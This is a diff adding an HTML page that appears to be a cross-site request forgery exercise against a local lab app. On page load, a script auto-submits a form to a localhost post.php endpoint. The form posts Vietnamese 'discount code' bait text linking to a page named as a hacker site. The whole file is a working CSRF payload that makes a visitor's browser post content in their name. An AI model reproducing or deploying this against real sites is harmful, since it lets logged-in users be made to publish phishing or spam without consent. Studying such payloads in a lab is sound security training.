@@ -1,0 +1,24 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body>
+    <form action="http://localhost:8380/CSRF/post.php" method="post" id="form_post">
+        <input type="text" name="detail" value='Lấy mã giảm giá <a href="http://localhost:8380/CSRF_hackersite">DISCOUNT</a>'>
+
+        <input type="text" class="btn-post" id="btn-post" value="Đăng">
+    </form>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", ready);
+        function ready(){
+            document.getElementById("form_post").submit();
+        }
+    </script>
+</body>
+
+</html>
